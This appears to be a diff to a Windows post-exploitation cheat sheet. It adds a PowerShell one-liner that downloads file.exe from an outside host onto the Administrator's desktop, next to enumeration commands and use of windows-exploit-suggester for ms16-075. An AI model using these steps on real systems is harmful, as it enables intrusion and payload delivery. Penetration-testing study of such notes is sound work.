@@ -31,6 +31,9 @@ netsh firewall show config*
     List windows services
     *$ net start*
 
+    Downloading files in Windows:
+    *(new-object System.Net.WebClient).DownloadFile('http://1.1.1.1/file.exe','C:\Users\Administrator\Desktop\file.exe')*
+
     Once you know the updates installed, you can find known exploits using windows-exploit-suggester.
     *$ ./windows-exploit-suggester.py -d 2017-02-09-mssb.xls -p ms16-075
 [*] initiating winsploit version 3.2…
